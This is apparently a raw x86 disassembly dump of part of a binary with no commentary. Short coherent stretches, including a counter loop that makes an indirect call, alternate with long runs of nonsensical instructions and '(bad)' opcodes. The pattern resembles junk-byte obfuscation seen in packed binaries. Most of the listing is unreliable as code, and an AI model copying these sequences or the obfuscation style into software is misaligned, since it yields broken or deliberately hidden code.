  40ea23:	jle    0x40ea4b
  40ea25:	outs   dx,DWORD PTR ds:[esi]
  40ea26:	dec    ebp
  40ea27:	inc    ecx
  40ea28:	mov    ebx,0x99b3cda4
  40ea2d:	cmp    DWORD PTR [esi+eax*4-0x74efddd3],0x7c56cfc6
  40ea38:	fnstsw WORD PTR [ebx-0x2cedf14e]
  40ea3e:	and    DWORD PTR [esi],ecx
  40ea40:	add    bh,BYTE PTR [eax]
  40ea42:	imul   esi,eax,0xb806eb35
  40ea48:	pop    es
  40ea49:	xchg   esp,eax
  40ea4a:	mov    edx,0xf1ea6cd9
  40ea4f:	dec    ebp
  40ea50:	call   0x62628015
  40ea55:	loope  0x40e9f9
  40ea57:	stos   DWORD PTR es:[edi],eax
  40ea58:	outs   dx,BYTE PTR ds:[esi]
  40ea59:	pop    ebp
  40ea5a:	xchg   esi,eax
  40ea5b:	sbb    edi,DWORD PTR [ecx-0x13]
  40ea5e:	xlat   BYTE PTR ds:[ebx]
  40ea5f:	and    ebp,DWORD PTR [esi-0x5f]
  40ea62:	and    esp,edx
  40ea64:	pop    ecx
  40ea65:	mov    esp,0xa042893d
  40ea6a:	adc    bl,bl
  40ea6c:	pop    esi
  40ea6d:	xchg   ebx,eax
  40ea6e:	lahf   
  40ea6f:	push   edx
  40ea70:	stos   BYTE PTR es:[edi],al
  40ea71:	inc    esi
  40ea72:	test   DWORD PTR [ebp-0x7a],esp
  40ea75:	test   eax,0xcdd5f889
  40ea7a:	enter  0x22b9,0x95
  40ea7e:	xor    al,0xda
  40ea80:	(bad)  
  40ea81:	rcl    edi,1
  40ea83:	sub    al,0x19
  40ea86:	add    esi,esi
  40ea88:	sti    
  40ea89:	pop    ds
  40ea8a:	outs   dx,BYTE PTR ds:[esi]
  40ea8b:	pop    ecx
  40ea8c:	add    BYTE PTR [ecx],al
  40ea8e:	faddp  st(0),st
  40ea90:	pop    esp
  40ea91:	add    DWORD PTR [ebp+0x79],0xfffffff8
  40ea95:	(bad)  
  40ea97:	ss push cs
  40ea99:	icebp  
  40ea9a:	cdq    
  40ea9b:	scas   al,BYTE PTR es:[edi]
  40ea9c:	cdq    
  40ea9d:	jle    0x40eab4
  40ea9f:	mov    ds:0x850f8b5e,eax
  40eaa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eaa5:	add    BYTE PTR [eax],al
  40eaa7:	add    BYTE PTR [ebx],al
  40eaa9:	retf   0x458b
  40eaac:	or     BYTE PTR [ecx+0x443cd9],al
  40eab2:	add    BYTE PTR [ebx+0x1513f04d],cl
  40eab8:	gs cld 
  40eaba:	inc    edx
  40eabb:	add    BYTE PTR [ebx],dh
  40eabd:	mov    BYTE PTR [ebx],0xc7
  40eac0:	mov    DWORD PTR [ecx],eax
  40eac2:	sbb    ecx,0x77dc
  40eac8:	mov    eax,DWORD PTR [ebp-0x10]
  40eacb:	adc    ecx,0x4d7b
  40ead1:	mov    ecx,DWORD PTR [ebp-0x14]
  40ead4:	mov    DWORD PTR ds:0x42e0a8,0x11
  40eade:	cmp    DWORD PTR ds:0x42e0a8,0x0
  40eae5:	je     0x40eb43
  40eaeb:	cmp    DWORD PTR ds:0x42e0a8,0x2
  40eaf2:	jne    0x40eb15
  40eaf8:	push   0x42e0b0
  40eafd:	push   0x42e0ef
  40eb02:	push   0x1c20
  40eb07:	push   DWORD PTR [ebp-0x10]
  40eb0a:	push   0x848e
  40eb0f:	call   DWORD PTR ds:0x42e28f
  40eb15:	cmp    DWORD PTR ds:0x42e0a8,0x3
  40eb1c:	jne    0x40eb31
  40eb22:	xor    edx,edx
  40eb24:	or     edx,DWORD PTR ds:0x42e0a8
  40eb2a:	dec    edx
  40eb2b:	mov    DWORD PTR ds:0x42e0a8,edx
  40eb31:	mov    edx,DWORD PTR ds:0x42e0a8
  40eb37:	dec    edx
  40eb38:	mov    DWORD PTR ds:0x42e0a8,edx
  40eb3e:	jmp    0x40eade
  40eb43:	xor    ecx,esi
  40eb45:	mov    edx,0xffcd8d64
  40eb4a:	sub    edx,ecx
  40eb4c:	add    DWORD PTR [eax],edx
  40eb4e:	mov    eax,ds:0x41b27c
  40eb53:	mov    eax,DWORD PTR [eax]
  40eb55:	mov    cx,WORD PTR [ebp-0x4]
  40eb59:	movzx  ecx,cx
  40eb5c:	add    ecx,DWORD PTR [eax]
  40eb5e:	mov    DWORD PTR [ebp-0x1c],ecx
  40eb61:	mov    eax,DWORD PTR [ebp+0xc]
  40eb64:	mov    ecx,DWORD PTR [ebp+0xc]
  40eb67:	xor    eax,esi
  40eb69:	lea    eax,[eax+eax*1+0x32729c]
  40eb70:	xor    ecx,esi
  40eb72:	sub    ecx,eax
  40eb74:	mov    ax,WORD PTR [ebp-0x4]
  40eb78:	movzx  eax,ax
  40eb7b:	jmp    0x40ece5
  40eb80:	or     BYTE PTR [edi],dl
  40eb82:	shr    BYTE PTR [edx-0x31],0x71
  40eb86:	mov    dl,0x71
  40eb88:	inc    eax
  40eb89:	(bad)  
  40eb8a:	pop    esp
  40eb8b:	mov    ch,0xb3
  40eb8d:	test   al,0x3f
  40eb8f:	test   bh,dh
  40eb91:	scas   eax,DWORD PTR es:[edi]
  40eb92:	jo     0x40ec04
  40eb94:	ret    
  40eb95:	jg     0x40ec07
  40eb97:	jo     0x40ec08
  40eb99:	das    
  40eb9a:	mov    eax,0x9f321d60
  40eb9f:	fisttp WORD PTR [ebp-0x17]
  40eba2:	div    BYTE PTR [edi+0x2fcdf0cf]
  40eba8:	popa   
  40eba9:	xchg   esp,eax
  40ebaa:	cmp    al,0x7a
  40ebac:	test   al,0x95
  40ebae:	fistp  QWORD PTR [eax+0x4]
  40ebb1:	into   
  40ebb2:	mov    ah,0x3c
  40ebb4:	mov    ecx,0xd59a39f9
  40ebb9:	jmp    0x40eb3f
  40ebbb:	cmp    ch,BYTE PTR [ebp+0x60fb3199]
  40ebc1:	dec    edx
  40ebc2:	mov    esp,DWORD PTR [esi]
  40ebc4:	push   cs
  40ebc5:	ret    0xd797
  40ebc8:	sar    DWORD PTR [eax],1
  40ebca:	ret    0x5ae8
  40ebcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebce:	js     0x40ec3c
  40ebd0:	shl    BYTE PTR [edi+eax*4],cl
  40ebd3:	sbb    cl,BYTE PTR [edi+0x8]
  40ebd6:	dec    ebx
  40ebd7:	es (bad) 
  40ebd9:	scas   al,BYTE PTR es:[edi]
  40ebda:	aad    0xcb
  40ebdc:	out    dx,eax
  40ebdd:	fdiv   st,st(2)
  40ebdf:	stos   DWORD PTR es:[edi],eax
  40ebe0:	mov    ah,0x21
  40ebe2:	and    esp,DWORD PTR [ebp+0x7200bd4c]
  40ebe8:	push   0xde59850f
  40ebed:	sahf   
  40ebee:	and    BYTE PTR [ebp+0x17681100],bl
  40ebf4:	push   ds
  40ebf5:	adc    esi,DWORD PTR [edx-0x2a4f5cf6]
  40ebfb:	sbb    edx,DWORD PTR ds:[ebx+0x78700943]
  40ec02:	loope  0x40ebbd
  40ec04:	or     eax,0xeb7e2f6
  40ec09:	or     dh,0x26
  40ec0c:	mov    edx,0x56967aa6
  40ec11:	stc    
  40ec12:	in     eax,dx
  40ec13:	hlt    
  40ec14:	mov    edx,0x35239a77
  40ec19:	mul    DWORD PTR [esi]
  40ec1b:	push   ebp
  40ec1c:	pop    es
  40ec1d:	sti    
  40ec1e:	pusha  
  40ec1f:	scas   eax,DWORD PTR es:[edi]
  40ec20:	test   DWORD PTR [esi],esp
  40ec22:	mov    esp,0x12df6352
  40ec27:	mov    DWORD PTR [esi-0x2c],ebx
  40ec2a:	sbb    esp,ebp
  40ec2c:	xor    DWORD PTR [ecx],eax
  40ec2e:	popa   
  40ec2f:	repnz in al,dx
  40ec31:	arpl   WORD PTR [esi+0x6],bp
  40ec34:	mov    ds:0xc6173daf,eax
  40ec39:	les    eax,FWORD PTR [eax-0x1d]
  40ec3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec3d:	sbb    al,0xcc
  40ec3f:	and    DWORD PTR [ebp-0x6bf706c],eax
  40ec45:	sbb    DWORD PTR [edi-0x5b],0xffffffe3
  40ec49:	fs call 0x9094:0x6cd97f3f
  40ec51:	ret    
  40ec52:	js     0x40ecb2
  40ec54:	in     eax,dx
  40ec55:	push   ecx
  40ec56:	lods   eax,DWORD PTR ds:[esi]
  40ec57:	jg     0x40ec50
  40ec59:	addr16 xchg esi,eax
  40ec5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec5c:	mov    edx,0xfa8ccf67
  40ec61:	popf   
  40ec62:	daa    
  40ec63:	es cmp al,0xa7
  40ec66:	push   esi
  40ec67:	push   eax
  40ec68:	scas   eax,DWORD PTR es:[edi]
  40ec69:	pop    edi
  40ec6a:	mul    BYTE PTR [edx]
  40ec6c:	test   dh,bl
  40ec6e:	dec    eax
  40ec6f:	repz mov WORD PTR [ecx],cs
  40ec72:	sahf   
  40ec73:	push   cs
  40ec74:	mov    esi,DWORD PTR [eax]
  40ec76:	push   ebp
  40ec77:	loopne 0x40ec2f
  40ec79:	stos   BYTE PTR es:[edi],al
  40ec7a:	adc    ah,ch
  40ec7c:	mov    edx,0x9376624a
  40ec81:	out    0x69,eax
  40ec83:	jp     0x40ec09
  40ec85:	ss pop esi
  40ec87:	fstp   DWORD PTR [eax]
  40ec89:	dec    eax
  40ec8a:	mov    bh,0xd7
  40ec8c:	mov    esp,0xd0a1d6a9
  40ec91:	jmp    0xcc49:0x57efcaff
  40ec98:	sub    eax,0xd73f047
  40ec9d:	jo     0x40ece5
  40ec9f:	outs   dx,DWORD PTR ds:[esi]
  40eca0:	add    eax,0xdedaf5e4
  40eca5:	or     DWORD PTR [eax-0x1342c196],esp
  40ecab:	xor    eax,0x6484c71a
  40ecb0:	or     al,0x7f
  40ecb2:	dec    esi
  40ecb3:	mov    dl,BYTE PTR [eax]
  40ecb5:	xchg   esp,eax
  40ecb6:	or     eax,0x6d9f9f95
  40ecbb:	mov    bl,ah
  40ecbd:	sub    bh,BYTE PTR [edi-0x52]
  40ecc0:	xor    ch,ah
  40ecc2:	lods   eax,DWORD PTR ds:[esi]
  40ecc3:	arpl   ax,si
  40ecc5:	add    ecx,edx
  40ecc7:	and    edi,eax
  40ecc9:	daa    
  40ecca:	lea    eax,[ebx+edx*8-0x71]
  40ecce:	sub    al,0xd3
  40ecd0:	popf   
  40ecd1:	push   edx
  40ecd2:	xor    BYTE PTR [esi+0x63ec8a34],dh
  40ecd8:	repz imul ebp,ebx,0x69137cc
  40ecdf:	pop    ebp
  40ece0:	pop    ebp
  40ece1:	sbb    dh,BYTE PTR [eax-0x24]
  40ece4:	pop    edi
  40ece5:	cmp    eax,ecx
  40ece7:	mov    eax,DWORD PTR [ebp-0x14]
  40ecea:	movzx  ecx,WORD PTR [ebp-0x4]
  40ecee:	jmp    0x40ee58
  40ecf3:	movntps XMMWORD PTR [edi+edi*8+0x64],xmm4
  40ecf8:	push   edi
  40ecf9:	rep stos DWORD PTR es:[edi],eax
  40ecfb:	mov    dh,0x81
  40ecfd:	push   ebx
  40ecfe:	jle    0x40ecf7
  40ed00:	rol    DWORD PTR [edi+0x70aeba25],1
  40ed06:	jo     0x40eccb
  40ed08:	jg     0x40ed7a
  40ed0a:	jo     0x40ed81
  40ed0c:	es add ebx,ebp
  40ed0f:	adc    eax,0xbd30f00a
  40ed14:	xor    al,0xbf
  40ed16:	call   0x76e3:0xeaa70f82
  40ed1d:	out    0x5a,eax
  40ed1f:	in     al,0xef
  40ed21:	push   eax
  40ed22:	cmp    DWORD PTR [ebx+edx*1],edx
  40ed25:	inc    esi
  40ed26:	push   ss
  40ed27:	fist   DWORD PTR [ecx-0x58]
  40ed2a:	jecxz  0x40ecd7
  40ed2c:	ins    DWORD PTR es:[edi],dx
  40ed2d:	test   BYTE PTR [ecx-0x290d2bb0],al
  40ed33:	or     al,ch
  40ed35:	mov    al,0x8a
  40ed37:	jg     0x40ecbf
  40ed39:	retf   
  40ed3a:	mov    al,ds:0x6103b3f8
  40ed3f:	(bad)  
  40ed40:	rcl    dh,cl
  40ed42:	sub    al,BYTE PTR ds:0x5a1b9f33
  40ed48:	jae    0x40edc2
  40ed4a:	jae    0x40ed8f
  40ed4c:	pusha  
  40ed4d:	into   
  40ed4e:	imul   ecx,DWORD PTR [ebx+0x26],0xffffff84
  40ed52:	jge    0x40ed1a
  40ed54:	jge    0x40edaf
  40ed56:	aaa    
  40ed57:	push   es
  40ed58:	pop    esp
  40ed59:	popa   
  40ed5a:	bound  ebx,QWORD PTR [ebx+edx*1]
  40ed5d:	adc    eax,0x11bd282c
  40ed62:	inc    eax
  40ed63:	jecxz  0x40ed70
  40ed65:	push   edx
  40ed66:	loop   0x40edca
  40ed68:	push   cs
  40ed69:	ret    0xb2f4
  40ed6c:	hlt    
  40ed6d:	jmp    0x40ed77
  40ed6f:	es mov eax,0xa0e3d2aa
  40ed75:	sub    eax,0x39749616
  40ed7a:	push   0x6d0088c7
  40ed7f:	loopne 0x40ed88
  40ed81:	aas    
  40ed82:	mov    ebx,0xee27552e
  40ed87:	ret    
  40ed88:	pop    ecx
  40ed89:	or     eax,0xeb818b5c
  40ed8e:	xchg   esi,eax
  40ed8f:	adc    eax,0x24c6ee0b
  40ed94:	test   eax,0x20f675d3
  40ed99:	imul   ecx,DWORD PTR [eax],0xd45ee21a
  40ed9f:	je     0x40eda4
  40eda1:	mov    esi,DWORD PTR [ecx-0x79]
  40eda4:	lds    esp,FWORD PTR [ecx]
  40eda6:	xor    DWORD PTR [ecx+0x2f76560a],ecx
  40edac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edad:	pop    edx
  40edae:	lods   eax,DWORD PTR ds:[esi]
  40edaf:	sub    dh,BYTE PTR [edx]
  40edb1:	nop
  40edb2:	xchg   BYTE PTR [ebp-0x129dc20],ch
  40edb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edb9:	mov    ch,BYTE PTR [eax]
  40edbb:	ds out 0xe9,al
  40edbe:	sbb    BYTE PTR [edx-0x45defe83],ch
  40edc4:	call   0xd206:0xcdacc99b
  40edcb:	or     eax,0x2d0bcbf5
  40edd0:	(bad)  [ecx-0x69]
  40edd3:	leave  
  40edd4:	mov    al,ds:0x616565e1
  40edd9:	adc    al,BYTE PTR [edi+0x53]
  40eddc:	ins    BYTE PTR es:[edi],dx
  40eddd:	jb     0x40eda0
  40eddf:	jmp    0x38ceef3a
  40ede4:	cli    
  40ede5:	sub    BYTE PTR [edx-0xf],bh
  40ede8:	sub    dh,BYTE PTR [esi]
  40edea:	sub    edx,DWORD PTR [esp+ebx*2+0xcf18417]
  40edf1:	pop    eax
  40edf2:	test   eax,0x6117dd11
  40edf7:	push   edx
  40edf8:	aad    0xbe
  40edfa:	icebp  
  40edfb:	jp     0x40ee19
  40edfd:	mov    edi,0x79e5886
  40ee02:	inc    edx
  40ee03:	xchg   ebp,eax
  40ee04:	or     DWORD PTR [ebx],esi
  40ee06:	pop    ebx
  40ee07:	sub    BYTE PTR [ebx-0x74],0x9
  40ee0b:	pop    ecx
  40ee0c:	or     dh,BYTE PTR [edx+edi*2+0x7bbaf8d5]
  40ee13:	loop   0x40edb4
  40ee15:	push   esp
  40ee16:	fstp   QWORD PTR [edx-0x2e]
  40ee19:	xor    edx,DWORD PTR [edx]
  40ee1b:	add    eax,0x86c3823
  40ee20:	call   0x1d06:0x95d47831
  40ee27:	and    ah,0x6c
  40ee2a:	dec    edx
  40ee2b:	shl    bh,1
  40ee2d:	cmp    DWORD PTR [ebx-0x328e6e4d],esp
  40ee33:	cmp    ch,BYTE PTR [ebp+0x32b60c72]
  40ee39:	and    ebp,DWORD PTR [ebx+0x2]
  40ee3c:	cmovb  edi,ebp
  40ee3f:	xor    BYTE PTR [esi-0x42],ch
  40ee42:	out    0xdc,al
  40ee44:	xor    ebx,0xd41e12e9
  40ee4a:	fnstcw WORD PTR [eax-0x51cbef4b]
  40ee50:	xor    al,dl
  40ee52:	js     0x40eea2
  40ee54:	out    dx,al
  40ee55:	mov    cl,0x33
  40ee57:	sbb    al,0xf
  40ee59:	(bad)  
  40ee5a:	jns    0x40ee5d
  40ee5c:	add    BYTE PTR [eax],al
  40ee5e:	xor    eax,esi
  40ee60:	sub    ecx,eax
  40ee62:	sub    ecx,edi
  40ee64:	mov    WORD PTR [ebp-0x4],cx
  40ee68:	jmp    0x40efe4
  40ee6d:	jmp    0x40efd7
  40ee72:	int3   
  40ee73:	push   ebp
  40ee74:	(bad)  
  40ee75:	icebp  
  40ee76:	xchg   ecx,eax
  40ee77:	icebp  
  40ee78:	je     0x40eeef
  40ee7a:	in     al,0x65
  40ee7c:	pop    edx
  40ee7d:	mov    cl,0xd0
  40ee7f:	cld    
  40ee80:	push   cs
  40ee81:	call   0x7fc3:0x7070ac0d
  40ee88:	jo     0x40eefa
  40ee8a:	mov    ?,esi
  40ee8c:	jo     0x40ee1d
  40ee8e:	adc    ecx,DWORD PTR [edi+0x4f11117e]
  40ee94:	addr16 xchg esp,eax
  40ee96:	js     0x40ee3e
  40ee98:	das    
  40ee99:	jno    0x3486a8aa
  40ee9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eea0:	stos   BYTE PTR es:[edi],al
  40eea1:	push   edx
  40eea2:	sub    bl,BYTE PTR [ebp+0x48]
  40eea5:	fs loope 0x40eeec
  40eea8:	std    
  40eea9:	mov    ch,0xa8
  40eeab:	mov    dl,0x2f
  40eead:	mov    cl,0x75
  40eeaf:	mov    al,ds:0x753de996
  40eeb4:	sbb    eax,0x19a87ee7
  40eeb9:	jae    0x40ef05
  40eebb:	iret   
  40eebc:	xchg   DWORD PTR [eax+0x2e],esi
  40eebf:	rcr    BYTE PTR [ecx],0x51
  40eec2:	dec    esp
  40eec3:	cmp    eax,0x87ac2072
  40eec8:	out    dx,eax
  40eec9:	and    ah,cl
  40eecb:	jg     0x40eec3
  40eecd:	xchg   ebp,eax
  40eece:	popf   
  40eecf:	std    
  40eed0:	adc    ebp,ecx
  40eed2:	push   0x16
  40eed4:	cmp    BYTE PTR [ebx],ah
  40eed6:	leave  
  40eed7:	jnp    0x40ee69
  40eed9:	mov    ds:0xa8aa8cd,eax
  40eede:	sub    DWORD PTR [ebx],ebx
  40eee0:	iret   
  40eee1:	xlat   BYTE PTR ds:[ebx]
  40eee2:	sti    
  40eee3:	retf   0x2996
  40eee6:	out    0xab,eax
  40eee8:	mov    cl,0x6e
  40eeea:	repz call 0x49c6fa24
  40eef0:	test   DWORD PTR [ebx+0x30610db0],ebx
  40eef6:	inc    ecx
  40eef7:	lea    esi,[edx+0x2c]
  40eefa:	out    dx,eax
  40eefb:	push   edi
  40eefc:	out    dx,al
  40eefd:	ret    0x210f
  40ef00:	aas    
  40ef01:	fist   DWORD PTR [esi-0x4f]
  40ef04:	fadd   st(5),st
  40ef06:	mov    ss,WORD PTR ds:0x5a07bf18
  40ef0c:	cmp    BYTE PTR [edi-0x3002497c],ah
  40ef12:	sub    esi,DWORD PTR [ecx+0x6e]
  40ef15:	jle    0x40ef6a
  40ef17:	jb     0x40ef70
  40ef19:	retf   0x1e52
  40ef1c:	push   esp
  40ef1d:	ds dec esp
  40ef1f:	add    ch,BYTE PTR [esi-0x64]
  40ef22:	out    dx,eax
  40ef23:	jae    0x40ef9b
  40ef25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef26:	mov    eax,ss
  40ef28:	pushf  
  40ef29:	push   ebp
  40ef2a:	jl     0x40eeff
  40ef2c:	sub    DWORD PTR [edx],esp
  40ef2e:	pop    ss
  40ef2f:	mov    ah,BYTE PTR [edi+0x56f40a9]
  40ef35:	fiadd  DWORD PTR [edi+0x34bb0643]
  40ef3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef3d:	ror    BYTE PTR [ebx+0x53d0f88],cl
  40ef43:	lods   eax,DWORD PTR ds:[esi]
  40ef44:	mov    ebx,0xf1b76279
  40ef49:	push   es
  40ef4a:	in     al,0x76
  40ef4c:	or     DWORD PTR [edx-0x31],edi
  40ef4f:	xor    eax,0x19f11732
  40ef54:	dec    ebx
  40ef55:	mov    cl,0xe7
  40ef57:	cmp    edx,DWORD PTR [edi+0x66cbdd53]
  40ef5d:	lea    edx,[ebx-0x1a]
  40ef60:	loop   0x40ef72
  40ef62:	sub    al,0xcb
  40ef64:	call   0xa130e771
  40ef69:	or     al,0xf9
  40ef6b:	xor    al,BYTE PTR [ecx-0x6228818f]
  40ef71:	(bad)  
  40ef72:	aam    0x6d
  40ef74:	xlat   BYTE PTR ds:[ebx]
  40ef75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef76:	and    al,0x33
  40ef78:	xchg   edi,eax
  40ef79:	fdivr  DWORD PTR [eax-0x34806272]
  40ef7f:	scas   eax,DWORD PTR es:[edi]
  40ef80:	prefetch BYTE PTR [edi+0x771e054d]
  40ef87:	mov    bh,0x60
  40ef89:	imul   edx,DWORD PTR [eax-0x31f30772],0x647c214d
  40ef93:	std    
  40ef94:	pop    ss
  40ef95:	jp     0x40efb9
  40ef97:	and    DWORD PTR [esi+0x2cf7c557],0xa8d7c5da
  40efa1:	jns    0x40ef8a
  40efa3:	ds jb  0x40efaf
  40efa6:	mov    bl,0x61
  40efa8:	mov    ebx,0x5afd8c6f
  40efad:	iret   
  40efae:	sbb    al,0xd5
  40efb0:	or     ebp,DWORD PTR [ecx-0x6d2ed0bf]
  40efb6:	mov    cs,WORD PTR [esi-0x2f9bb1f]
  40efbc:	add    BYTE PTR [edi+0x52],0x2f
  40efc0:	jg     0x40f009
  40efc2:	inc    esp
  40efc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efc4:	jnp    0x40f03f
  40efc6:	retf   
  40efc7:	mov    esi,DWORD PTR [edi]
  40efc9:	add    DWORD PTR [edi+0x49058b89],esi
  40efcf:	lock mov DWORD PTR ds:0x571c5db0,0x8dc6337a
  40efda:	test   BYTE PTR [eax],cl
  40efdc:	pushf  
  40efdd:	jb     0x40f011
  40efdf:	add    BYTE PTR [esi-0x77],ah
  40efe2:	inc    ebp
  40efe3:	cld    
  40efe4:	mov    eax,DWORD PTR [ebp-0xc]
  40efe7:	cmp    eax,ebx
  40efe9:	jmp    0x40f153
  40efee:	mov    cs,WORD PTR [ebx]
  40eff0:	enter  0x51c7,0xc3
  40eff4:	lea    edx,[ecx+0x2a]
  40eff7:	leave  
  40eff8:	inc    esi
  40eff9:	inc    ebx
  40effa:	fucom  st(5)
  40effc:	cmp    al,0x5
  40effe:	shr    BYTE PTR [ebx+0x7fc37070],1
  40f004:	jo     0x40f076
  40f006:	loope  0x40f054
  40f008:	int    0x23
  40f00a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f00b:	pusha  
  40f00c:	stc    
  40f00d:	push   ecx
  40f00e:	push   ds
  40f00f:	mov    BYTE PTR [ebp+0x1c],0x3f
  40f013:	mov    dh,BYTE PTR [ebx+0x221f1fe4]
  40f019:	inc    edx
  40f01a:	fild   DWORD PTR [edi+0x5272752f]
  40f020:	xcrypt-ofb (bad)
  40f021:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f022:	sub    DWORD PTR [ebp-0x76],ecx
  40f025:	pop    ecx
  40f026:	pop    ebp
  40f027:	test   al,0xbf
  40f029:	dec    ebx
  40f02a:	repz mov eax,0x54811fde
  40f030:	cmp    eax,0x4d75f9af
  40f035:	clc    
  40f036:	out    0x5c,eax
  40f038:	sub    eax,0x9b269f5c
  40f03d:	jge    0x40efcc
  40f03f:	pop    ebx
  40f040:	test   BYTE PTR [eax+0x7b],al
  40f043:	and    eax,0xb6a541b7
  40f048:	push   ecx
  40f049:	enter  0xd040,0xb9
  40f04d:	fnstsw WORD PTR [ecx]
  40f04f:	loope  0x40f094
  40f051:	outs   dx,BYTE PTR ds:[esi]
  40f052:	lock es aad 0x44
  40f056:	xchg   ecx,eax
  40f057:	test   BYTE PTR [esi],ch
  40f059:	neg    DWORD PTR [edi+0x46]
  40f05c:	ins    BYTE PTR es:[edi],dx
  40f05d:	xchg   edx,eax
  40f05e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f05f:	sub    DWORD PTR es:[ecx+0x2b6dcdef],esp
  40f066:	cmp    al,0xb2
  40f068:	mov    ds:0x8a68313c,al
  40f06d:	jbe    0x40f0bc
  40f06f:	(bad)  
  40f070:	cmp    dh,BYTE PTR [esi]
  40f072:	loop   0x40f04c
  40f074:	xchg   edx,eax
  40f075:	loop   0x40f05e
  40f077:	mov    ch,0x3d
  40f079:	or     ecx,DWORD PTR [esi+0x2b]
  40f07c:	int    0xac
  40f07e:	push   edx
  40f07f:	arpl   WORD PTR [edx+0x2b],bx
  40f082:	hlt    
  40f083:	out    0xeb,al
  40f085:	fst    DWORD PTR [eax+0x6e699674]
  40f08b:	dec    eax
  40f08c:	int3   
  40f08d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f08e:	hlt    
  40f08f:	loope  0x40f05a
  40f091:	retf   0xd806
  40f094:	push   ss
  40f095:	xor    al,0x5b
  40f097:	dec    ecx
  40f098:	mov    bl,0x5c
  40f09a:	repz imul ebp,DWORD PTR [ecx+edi*1+0x2f],0x8f84f822
  40f0a3:	not    BYTE PTR [esi]
  40f0a5:	jle    0x40f049
  40f0a7:	mov    eax,ds:0xa9b20ab3
  40f0ac:	sar    ch,cl
  40f0ae:	out    0xd7,eax
  40f0b0:	rcr    DWORD PTR [ebp-0x2bc99da5],cl
  40f0b6:	jns    0x40f07f
  40f0b8:	imul   ebx,ecx,0xffffffe0
  40f0bb:	cmp    DWORD PTR [ecx+0x29e6680c],edi
  40f0c1:	mov    al,0xa4
  40f0c3:	mov    BYTE PTR [ebp*2-0x3819af4d],ch
  40f0ca:	sbb    esi,DWORD PTR [eax-0x3f]
  40f0cd:	enter  0xe0f6,0x71
  40f0d1:	push   ss
  40f0d2:	call   0x82c4d0e8
  40f0d7:	xchg   edx,eax
  40f0d8:	popf   
  40f0d9:	sub    ebx,ecx
  40f0db:	jmp    0x40f10b
  40f0dd:	jecxz  0x40f0b9
  40f0df:	ja     0x40f13e
  40f0e1:	dec    ebp
  40f0e2:	imul   DWORD PTR [esi+0x7f]
  40f0e5:	mov    eax,0x53f35ee1
  40f0ea:	mov    ah,0x30
  40f0ec:	std    
  40f0ed:	(bad)  
  40f0ee:	es xchg esi,eax
  40f0f0:	pop    ds
  40f0f1:	ret    
  40f0f2:	nop
  40f0f3:	(bad)  ds:0x72c3f04
  40f0f9:	(bad)  
  40f0fa:	mov    al,ds:0x4ea95060
  40f0ff:	push   ebx
  40f100:	dec    esp
  40f101:	xchg   edx,eax
  40f102:	or     dh,cl
  40f104:	xor    al,0xcd
  40f106:	sbb    DWORD PTR [ecx+0x2cd0db04],edi
  40f10c:	icebp  
  40f10d:	outs   dx,DWORD PTR ds:[esi]
  40f10e:	adc    eax,0x41907557
  40f113:	call   0x1ba8:0xf419d961
  40f11a:	mov    ah,0x86
  40f11c:	jno    0x40f0e4
  40f11e:	scas   al,BYTE PTR es:[edi]
  40f11f:	rcl    DWORD PTR [esi],1
  40f121:	test   DWORD PTR ds:0xa508df76,esp
  40f127:	(bad)  
  40f128:	aaa    
  40f129:	and    DWORD PTR [edi*2-0x676013ce],0xd
  40f131:	or     ecx,0x9639d2f
  40f137:	sbb    al,0xe6
  40f139:	add    DWORD PTR [esi+0x39],0xffffffaf
  40f13d:	sub    BYTE PTR [ecx+0x58c1a1be],bh
  40f143:	pop    ds
  40f144:	std    
  40f145:	jnp    0x40f146
  40f147:	inc    esp
  40f148:	jp     0x40f164
  40f14a:	fwait
  40f14b:	and    DWORD PTR ds:0xa798dc4,edx
  40f151:	cmp    ebx,DWORD PTR [ecx+0xf]
  40f154:	test   BYTE PTR [eax+0x1],bh
  40f157:	add    BYTE PTR [eax],al
  40f159:	mov    eax,DWORD PTR [ebp-0x8]
  40f15c:	jmp    0x40f2c6
  40f161:	lods   eax,DWORD PTR ds:[esi]
  40f162:	ret    0xcc29
  40f165:	jno    0x40f15a
  40f167:	ins    DWORD PTR es:[edi],dx
  40f168:	popa   
  40f169:	fdivr  DWORD PTR [ecx]
  40f16b:	xchg   ecx,eax
  40f16c:	test   DWORD PTR [edx+eax*8],edx
  40f16f:	sub    ecx,DWORD PTR [edx]
  40f171:	mov    ds:0xc37070aa,eax
  40f176:	jg     0x40f1e8
  40f178:	jo     0x40f182
  40f17a:	mov    ebx,DWORD PTR [ebx+0x1b]
  40f17d:	cmp    edi,ecx
  40f17f:	test   al,0xd8
  40f181:	cmp    al,0x2c
  40f183:	shl    BYTE PTR [ecx-0x1d],cl
  40f186:	sub    DWORD PTR [ebx-0x243b9a48],0xabe78007
  40f190:	and    al,0x1d
  40f192:	dec    esp
  40f193:	add    edx,DWORD PTR [eax]
  40f195:	xor    edi,DWORD PTR [eax+0x742d47d5]
  40f19b:	rcl    BYTE PTR [ebp+0x59adf8bf],cl
  40f1a1:	bound  edi,QWORD PTR [edx+0x72]
  40f1a4:	push   ecx
  40f1a5:	push   ebx
  40f1a6:	cmp    BYTE PTR [eax+0x71],dl
  40f1a9:	mov    al,ds:0xfb34c781
  40f1ae:	mov    ds:0x82972b45,al
  40f1b3:	sub    edi,DWORD PTR [edx]
  40f1b5:	loop   0x40f1df
  40f1b7:	pop    esp
  40f1b8:	xor    al,0xa6
  40f1ba:	adc    al,0x79
  40f1bc:	test   al,0x17
